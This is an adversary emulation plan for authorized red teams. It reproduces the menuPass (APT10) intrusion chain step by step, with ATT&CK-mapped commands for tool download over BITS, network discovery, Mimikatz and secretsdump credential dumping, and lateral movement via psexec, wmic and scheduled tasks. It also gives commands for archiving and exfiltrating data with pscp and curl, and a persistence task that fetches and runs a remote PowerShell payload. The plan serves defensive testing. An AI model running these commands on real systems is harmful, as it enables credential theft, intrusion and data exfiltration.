# Preface

The menuPass adversary emulation plan is comprised of two scenarios.  These scenarios were designed to be representative of the common corpus of publicly available reporting attributed to menuPass.  Each organization can tailor this emulation to their individual use case, priorities, and available resources.  Reconnaissance, resource development, and initial access considerations have been included for your consideration, and while relevant, are not necessary to remain operationally representative.

Scenario 1 is designed to emulate activity attributed to menuPass that is specific to the group's efforts targeting MSP subscriber networks.  Initial access could be achieved by either spearphishing or an assumed breach in which the emulation team is granted access to the environment using VPN, RDP, and elevated credentials.  menuPass is widely reported to have accessed customer networks from MSP networks using elevated credentials.  In pursuing an assumed breach scenario, you will be assessing the ability to protect, detect, and respond to execution, credential access, lateral movement, and exfiltration.  Your goal for Scenario 1 is to access a host, upload an operational toolkit, identify systems for staging and persistence, identify systems that may contain data that would be of interest to an adversary, harvest additional credentials, move laterally to systems of interest, and ultimately exfiltrate data, real or simulated.  To make the most of this scenario, consider information within your environment that would be sought after by an adversary, identify the most likely attack paths, and determine the feasibility of pursuing these attack paths.

This emulation plan recommends procedures using tools reported to have been used by menuPass actors.  In some instances, assumptions have been made regarding tool syntax to account for intelligence gaps.  menuPass is reported to have used several different procedures to achieve similar objectives.  For the purpose of this emulation plan, we have selected one example and have presented the alternatives as  "Alternative Procedures."

# Scenario 1 Overview

* Emulating menuPass using VPN/RDP to access the environment and tools like tcping, netsess, mimikatz, psexec, and pscp to achieve tactical objectives with the operational intent of exfiltrating data.
* Scenario 1 begins after a host is compromised/accessed and the operational toolkit is deployed.
* The purpose of Scenario 1 is to assess your organization's ability to protect, detect, and defend tool ingress, discovery, credential harvesting, lateral movement, and exfiltration.

## Prerequisites

* You have either ownership of, or explicit authority and/or authorization to operate against the target network.
* You have established your operational infrastructure.
* You have acquired and compiled your operational toolkit

## Contents

* [Step 1 - Initial Access](#step-1---menupass-initial-access)
* [Step 2 - Command and Control](#step-2---menupass-command-and-control)
* [Step 3 - Discovery](#step-3---menupass-discovery)
* [Step 4 - Credential Access](#step-4---menupass-credential-access)
* [Step 5 - Lateral Movement](#step-5---menupass-lateral-movement)
* [Step 6 - Collection](#step-6---menupass-collection)
* [Step 7 - Exfiltration](#step-7---menupass-exfiltration)
* [Step 8 - Execution](#step-8---menupass-execution)
* [Step 9 - Persistence](#step-9---menupass-persistence)

---

## Step 1 - menuPass Initial Access

### Procedures

#### 1.A - Trusted Relationship ([T1199](https://attack.mitre.org/techniques/T1199/)), Valid Accounts - Domain Accounts ([T1078.002](https://attack.mitre.org/techniques/T1078/002/))

menuPass is perhaps best known for what has been referred to as "Operation Cloud Hopper."<sup>[4](https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-report-final-v4.pdf)</sup> <sup>[7](https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf)</sup> This activity is believed to have spanned from 2014-2018 and initially resulted in the compromise of several of the world's largest Managed Service Providers (MSP).  Ultimately, these MSP's were not the final objective.  menuPass would leverage its previously attained access to MSP networks to pivot into customer networks that aligned with the group's collection objectives.

To do so, after gaining access to the MSP network, menuPass actors are reported to have sought out shared infrastructure.  menuPass actors are thought to have initially breached customer networks by using elevated MSP or subscriber domain credentials and remote access applications.<sup>[4](https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-report-final-v4.pdf)</sup>  Emulating initial access can be as simple as providing the emulation team with a VPN/RDP connection.  menuPass is reported to have initially accessed MSP subscriber networks with elevated permissions, so too should the emulation team.<sup>[4](https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-report-final-v4.pdf)</sup>

---

## Step 2 - menuPass Command and Control

### Procedures

#### 2.A - Ingress Tool Transfer ([T1105](https://attack.mitre.org/techniques/T1105))

menuPass is reported to have used BITSAdmin to transfer tools from external infrastructure to hosts in the victim's network.  The tools were reported to have been dropped in C:\ProgramData\temp and C:\ProgramData\media.<sup>[10](https://recordedfuture.com/apt10-cyberespionage-campaign/)</sup>

Prior to transferring tools to the foothold, ensure they are compiled (if required) and renamed accordingly (optional). For this step, you should consider transferring secretsdump, atexec, psexec, nbtscan, netsess, tcping, nmap, winrar, pscp, and curl.

```cmd
C:\users\CVNX> powershell.exe
PS C:\users\CVNX> Start-BitsTransfer -Source #{ } -Destination #{ }
```

Example:

```cmd
PS C:\users\CVNX> Start-BitsTransfer -Source http://123.456.7.89/TWUEGJDITXAONVPUOWFV -Destination C:\ProgramData\temp\TWUEGJDITXAONVPUOWFV
```

---

## Step 3 - menuPass Discovery

### Procedures

#### 3.A - System Network Connections Discovery ([T1049](https://attack.mitre.org/techniques/T1049))

List network connections to or from the compromised system.

```cmd
C:\users\CVNX> net use
```

#### 3.B - Remote System Discovery ([T1018](https://attack.mitre.org/techniques/T1018))

Identify remote systems using net.

```cmd
C:\users\CVNX> net view /domain
```

#### 3.C - Remote System Discovery ([T1018](https://attack.mitre.org/techniques/T1018))

Detect.vbs

menuPass is reported to have packaged it's network reconnaissance tools in "detect.vbs."  When executed, the base64 encoded file decodes itself using certutil and drops "subnet.exe" and "rund1132.exe" (tcping) to the current working directory.<sup>[7](https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf)</sup>  To emulate this activity, we suggest conducting remote system discovery, and using tcping to conduct network service scanning.  Reporting indicates that menuPass is specifically interested in identifying the status of ports 445 and 3389 for the purpose of lateral movement.

Example:

```cmd
PS C:\> Test-NetConnection 192.0.2.10
```

#### 3.D - Network Service Scanning ([T1046](https://attack.mitre.org/techniques/T1046))

menuPass has used tcping, renamed to rund1132.exe, to identify and query the status of remote hosts on ports 445 and 3389.<sup>[7](https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf)</sup>

```cmd
"#{tcping_local_path}"\tcping.exe "#{tcping_remote_ip}" "#{tcping_remote_port}"
```

Example:

```cmd
tcping.exe 192.0.2.10 445
```

#### 3.E - System Network Configuration Discovery ([T1016](https://attack.mitre.org/techniques/T1016))

menuPass has used nbtscan (nbt.exe) to scan for nameservers.<sup>[7](https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf)</sup>

nbtscan

```cmd
"#{nbtscan_local_path}"\nbtscan.exe "#{nbt_ip_range}"
```

Example:

```cmd
nbtscan.exe 192.0.2.10/24
```

#### 3.F - System Network Configuration Discovery ([T1016](https://attack.mitre.org/techniques/T1016))

menuPass has used netsess to enumerate NetBIOS sessions.<sup>[7](https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf)</sup>

NetSess

```cmd
"#{netsess_local_path}"\netsess.exe "#{netsess_remote_ip}"
```

Example:

```cmd
netsess.exe 192.0.2.10
```

---

## Step 4 - menuPass Credential Access

menuPass is thought to have initially accessed target environments using compromised credentials that granted elevated privileges.<sup>[4](https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-report-final-v4.pdf)</sup>  As such, privilege escalation was not necessary.  menuPass is reported to have sought access to additional credentials to ensure freedom of movement throughout the domain.<sup>[4](https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-report-final-v4.pdf)</sup>

The following procedures require elevated privileges.

### Procedures

#### 4.A - OS Credential Dumping: LSASS Memory ([T1003.001](https://attack.org/techniques/T1003/001)), Security Account Manager ([T1003.002](https://attack.mitre.org/techniques/T1003/002/)), LSA Secrets ([T1003.004](https://attack.mitre.org/techniques/T1003/004/))

#### Mimikatz (Local)

menuPass actors are reported to have used Mimikatz locally to gain access to additional credentials.  In some instances, Mimikatz was reported to have been uploaded to the compromised host and used to dump credentials from memory. <sup>[10](https://go.recordedfuture.com/hubfs/reports/cta-2019-0206.pdf)</sup>  In other instances, menuPass actors are reported to have sideloaded Mimikatz with various binaries. <sup>[7](https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf)</sup>  Mimikatz requires elevated privileges.

```cmd
"#{mimikatz_local_path}"\mimikatz.exe

mimikatz# privilege::debug

mimikatz# log gggg.log

mimikatz# sekurlsa::logonpasswords
```

#### 4.B - OS Credential Dumping: Security Account Manager ([T1003.002](https://attack.mitre.org/techniques/T1003/002/)), LSA Secrets ([T1003.004](https://attack.mitre.org/techniques/T1003/004/))

#### Secretsdump (Remote)

Secretsdump.py of the Impacket framework was compiled to secretsdump.exe and used to dump credentials remotely.<sup>[7](https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf)</sup>

```cmd
"#{secretsdump_local_path}"\secretsdump.exe #{Domain}/#{User}:#{Password}@#{Ip Address}
```

Example:

```cmd
secretsdump.exe domain/CVNX:password123!@123.456.78.9
```

---
## Step 5 - menuPass Lateral Movement

menuPass lateral movement can be interpreted as having the following steps: access, deployment, execution, control.  By this point in the operation, menuPass actors are elevated, have ingressed tools, performed discovery, and harvested additional credentials to ensure freedom of movement throughout the domain.  These legitimate but compromised credentials will be coupled with tools indicative of administrative funtion to either simulate exfiltration, or remotely access a host to deploy and run a lightweight implant, thereby establishing control.

An example of this work-flow is in reporting that indicates menuPass actors have used harvested credentials to access the domain controller, deploy Trochilus, and ultimately copy the NTDS.dit file.  The .dit file was staged, compressed and exfiltrated to attacker-controlled infrastructure.<sup>[11](https://recordedfuture.com/apt10-cyberespionage-campaign/)</sup>

menuPass is reported to have accessed remote hosts via RDP, PsExec, Atexec, or mapping network shares.<sup>[4](https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-report-final-v4.pdf)</sup> <sup>[7](https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf)</sup> <sup>[10](https://go.recordedfuture.com/hubfs/reports/cta-2019-0206.pdf)</sup>  These work flows are described in the scenarios listed below.  They are not, however, intended to be mutually exclusive.  We suggest attempting different methods of access and execution.

#### 5.A - System Services: Service Execution ([T1569.002](https://attack.mitre.org/techniques/T1569/002))

menuPass appears to have used different versions of the PsExec tool to achieve the same purpose, remote code execution.  Reporting indicates the attackers may have used Sysinternals PsExec and a compiled version of Impacket's psexec.py.<sup>[5](https://www.fireeye.com/blog/threat-research/2017/04/apt10_menupass_grou.html)</sup> <sup>[7](https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf)</sup> <sup>[12](https://us-cert.cisa.gov/ncas/alerts/TA17-117A)</sup>

```cmd
"#{psexec_local_path}"\psexec.exe "#{domain}"\"#{psexec_user}":"#{psexec_password}"@"#{psexec_remote_host}" "#{psexec_cmd}"
```

Example:

```cmd
psexec.exe domain\Administrator:badpassword123@192.0.2.10
```

#### Alternative Procedure 1: Remote Services - Remote Desktop Protocol ([T1021.001](https://attack.mitre.org/techniques/T1021/001))

menuPass has used RDP to move laterally.<sup>[4](https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-report-final-v4.pdf)</sup> <sup>[7](https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf)</sup>  RDP grants the attacker console access to a remote host.  This access can be leveraged to deploy tactical malware.  There are a number of ways by which the implant could be executed, but this example will detail how to do so using WMI.

1. Access - Access the remote host via RDP.

```cmd
mstsc /v #{ip_address}
```

2. Deploy - Upload tactical malware to the remote host via RDP session.

3. Execute - Use wmic to run the implant

```cmd
wmic /node:#{ip_address} /user:#{"user_name"} /password#{"password"} process call create #{file_to_execute}
```

#### Alternative Procedure 2: Remote Services - SMB/Windows Admin Shares ([T1021.002](https://attack.mitre.org/techniques/T1021/002)), Lateral Tool Transfer ([T1570](https://attack.mitre.org/techniques/T1570))

menuPass is reported to have moved laterally by mounting a network share, copying a file to the mounted share, and creating a scheduled task via Windows Task Scheduler to run the file.  After execution, the file was deleted.<sup>[10](https://recordedfuture.com/apt10-cyberespionage-campaign/)</sup>

1. Access - Mount a Network Share.

```cmd
net use #{drive}: #{ip_address}\#{drive} #{password} /user:#{domain}\#{user_name}
```


```cmd
Example: C:\users\CVNX> net use z: \\192.0.2.10\C$ /u:targetdomain\victim badpassword123
```

2. Check to ensure the network share is mapped:

```cmd
net use
```

3. Deploy - Copy tactical malware to the mapped network share.

```cmd
copy #{file} #{drive}\#{destination_dir}
```

```example

Example: copy #{file} z:\ProgramData\Temp

```

4. Execute - Create a Scheduled Task to Execute the File ([T1053.005](https://attack.mitre.org/techniques/T1053/005)):<sup>[10](https://recordedfuture.com/apt10-cyberespionage-campaign/)</sup> <sup>[22](https://jpcert.or.jp/present/2018/20171109codeblue2017_en.pdf)</sup>

```cmd
schtasks /create #{task_name} /tr #{path_of_the_file_to_run} /sc #{schedule} #{user_name} /s #{ip_address}
```

```cmd
Example: C:\Users\CVNX> schtasks /create /tn WinUpdate /tr C:\ProgramData\Temp\WinUpdate.exe /sc onstart /ru System /s 192.0.2.10
```

5. Deleting the mapped network drive:

```cmd
net use z: /delete
```

#### Alternative Procedure 3

menuPass actors are reported to have used atexec.py, compiled into an executable, to manipulate a remote machine's Task Scheduler and execute commands.<sup>[7](https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf)</sup>

```cmd
#{atexec_local_path}\atexec.exe #{domain}\#{username}:#{password}@#{ip_address} #{command}
```

```cmd
Example: atexec.exe domain\CVNX:'Password123!'@192.0.2.10 whoami
```

---

## Step 6 - menuPass Collection

### Procedures

#### 6.A - Archive Collected Data - Archive via Utility ([T1560.001](https://attack.mitre.org/techniques/T1560/001))

menuPass is thought to have renamed WinRAR to svchost.exe or r.exe, and used it to compress files prior to exfiltration.  The compression tools are reported to have been run using the group's renamed version of wmiexec ("t.vbs").<sup>[7](https://pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf)</sup> <sup>[10](https://recordedfuture.com/apt10-cyberespionage-campaign/)</sup>

```cmd
#{rar_local_path}\rar.exe a -hp #{password} #{rar_archive_name} #{rar_files}
```

menuPass Example:

```cmd
t.vbs r.exe a -hp CVNXPassword aa.rar rar_files
```

### Alternative Procedures

In the event that WinRAR is unavailable, the following procedures can be used to create archives.  Please note that the suggested procedures are not identical to those reported to have been used by menuPass actors and will not result in rar archives.  They will however, compress the files for exfiltration using software that is freely available to Windows users.

#### Alternative Procedure 1 - Tar

The following procedure is freely available on Windows 10, build 17063 and later.

```cmd
tar.exe -a -c -f #{archive_filename} #{files_to_archive}
```

menuPass Example:

```cmd
tar.exe -a -c -f aa.zip exfil.txt
```

#### Alternative Procedure 2 - PowerShell

```cmd
powershell.exe
Compress-Archive #{files_to_archive} #{archive_filename}
```

menuPass Example:

```cmd
powershell.exe
Compress-Archive exfil.txt aa.zip
```

#### 6.B - Local Data Staging ([T1074.001](https:/attack.mitre.org/techniques/T1074/001/))

menuPass actors are thought to have staged archives in the Recycle Bin for exfiltration.<sup>[4](https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-report-final-v4.pdf)</sup>

```cmd
copy #{file_name} C:\$Recycle.Bin\
```

menuPass Example:

```cmd
C:\Users\CVNX copy aa.rar C:\$Recycle.Bin
```

---

## Step 7 - menuPass Exfiltration

### Procedures

#### 7.A - Transfer Data to Cloud Account ([T1537](https://attack.mitre.org/techniques/T1537/))

menuPass is reported to have used the PSCP client, renamed to rundll32.exe to exfiltrate data.<sup>[7](https://pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf)</sup>

```cmd
"#{pscp_local_path}"\pscp.exe "#{pscp_exfil_files}" "#{pscp_user}"@"#{pscp_server}":/"#{pscp_drop_location}"
```

menuPass Example:

```cmd
rundll32.exe aa.rar CVNX@192.0.2.10:/temp/loot
```

#### Alternative Procedures

#### cURL

menuPass actors are reported to have used cURL to exfiltrate data to a cloud based storage provider.<sup>[10](https://recordedfuture.com/apt10-cyberespionage-campaign/)</sup>

```cmd
"#{curl_local_path}"\curl.exe -X POST -d #{file} #{exfiltration server}
```
menuPass Example:
```cmd
CU.exe -X POST -d aa.rar CVNX@192.0.2.10:/temp/loot
```
---

## Step 8 - menuPass Execution (Optional)

### Procedures

#### 8.A - Windows Management Instrumentation ([T1047](https://attack.mitre.org/techniques/T1047))

menuPass used a customized version of wmiexec to run tools and dump credentials.  These files are reported to have been dropped to C:\Recovery, C:\Intel, and C:\PerfLogs. <sup>[7](https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf)</sup>

For the purpose of this plan, if you choose to assume compromise, we recommend using wmiexec to run whatever tactical implant you will be using.

```cmd
cscript.exe "#{wmiexec_local_path}"\wmiexec.vbs /shell "#{wmiexec_remote_host}"
```

Example:

```cmd
cscript.exe C:\Windows\Temp\wmiexec.vbs /shell 192.0.2.10
```

### Alternative Procedure

#### Scheduled Task using Task Scheduler ([T1053.005](https://attack.mitre.org/techniques/T1053/005))

menuPass has used atexec.py, compiled to atexec.exe to execute commands on remote hosts through the Task Scheduler service.<sup>[7](https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf)</sup>

```cmd
atexec #{domain/username}:#{password}@#{ip address} #{command}
```

Example:

```cmd
atexec DOMAIN\Administrator:'badpassword123!'@192.0.2.10 systeminfo
```

---

## Step 9 - menuPass Persistence (Optional)

menuPass is reported to have been selective in persisting malware.  They are thought to have persisted sustained malware to specific systems and taken steps to ensure C2 would blend in with normal network communications.

### Procedures

#### 9.A - Scheduled Task ([T1053.005](https://attack.mitre.org/techniques/T1053/005))

menuPass is reported to have created scheduled tasks to persist PlugX.<sup>[4](https://pwc.co.uk/cyber-security/pdf/cloud-hopper-report-final-v4.pdf)</sup>

```cmd
schtasks /create /sc #{schtask_schedule} /tn #{schtask_taskname} /tr #{schtask_taskrun} /ru #{schtask_username}
```

```cmd
Example: schtasks /create /sc onlogon /tn WinUpdate /ru System /tr "powershell.exe -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://#{payload_server/#{payload}.ps1'})|iex""
```

### Alternative Procedures

#### Create or Modify System Process - Windows Service ([T1543.003](https://attack.mitre.org/techniques/T1543/003))

menuPass is reported to have persisted a PlugX implant by creating a Windows service.<sup>[5](https://fireeye.com/blog/threat-research/2017/04/apt10_menupass_grou.html)</sup>

```cmd
sc create #{CorWrTool} binPath=#{"\"C:\Windows\vss\vixDiskMountServer.exe\"" start=auto displayname="#{Corel Writing Tools Utility}" type=own
```

#### Boot or Logon Autostart Execution - Registry Run Keys ([T1547.001](https://attack.mitre.org/techniques/T1547/001))

menuPass is reported to have persisted EvilGrab and RedLeaves by creating a run keys.<sup>[7](https://pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf)</sup>

```cmd
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v ctfmon /t REG_SZ /d "c:\users\#{}\#{iechecker.exe}

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ISeC Croot Readr
```

---

## Additional Plan Resources

- [Intelligence Summary](/menuPass/Intelligence_Summary.md)
- [Operations Flow](/menuPass/Operations_Flow.md)
- [Emulation Plan](/menuPass/Emulation_Plan/README.md)
  - [Resource Development](/menuPass/Emulation_Plan/ResourceDevelopment.md)
  - [Infrastructure](/menuPass/Emulation_Plan/Infrastructure.md)
  - [Scenario 1](/menuPass/Emulation_Plan/Scenario1.md)
  - [Scenario 2](/menuPass/Emulation_Plan/Scenario2.md)
  - [YAML](/menuPass/Emulation_Plan/yaml)
- [Issues](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/issues)
- [Change Log](/menuPass/CHANGE_LOG.md)
